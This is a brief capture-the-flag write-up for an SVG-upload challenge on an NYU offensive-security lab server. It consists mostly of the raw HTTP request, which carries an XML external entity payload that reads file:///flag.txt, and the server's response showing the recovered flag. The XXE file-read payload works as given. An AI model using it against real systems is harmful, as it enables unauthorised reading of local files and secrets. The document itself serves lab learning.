50 points at `http://offsec-chalbroker.osiris.cyber.nyu.edu:1242`


Upload SVG image
SVGs are xml images, used an extermal entity

Request:
```
POST / HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1242
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------6576307283411909413958087272
Content-Length: 499
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1242
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1242/
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=76eu88qnnso29ql60ugh7f4bn6
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: pink

-----------------------------6576307283411909413958087272
Content-Disposition: form-data; name="uploaded"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
-----------------------------6576307283411909413958087272--
```


Response:
```
HTTP/1.1 200 OK
Date: Wed, 10 Apr 2024 00:17:34 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Vary: Accept-Encoding
Content-Length: 360
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
    <head>
        <title>SVG to Text</title>
    </head>
    <body>
        <div id="content">
            <div align="center">
                <h1>SVG Text Extractor</h1>
                <br /><br /><br /><br />

<p>Detected text:</p>flag{XXE_is_such_a_forced_acronym___}
            </div>
        </div>
    </body>
</html>
```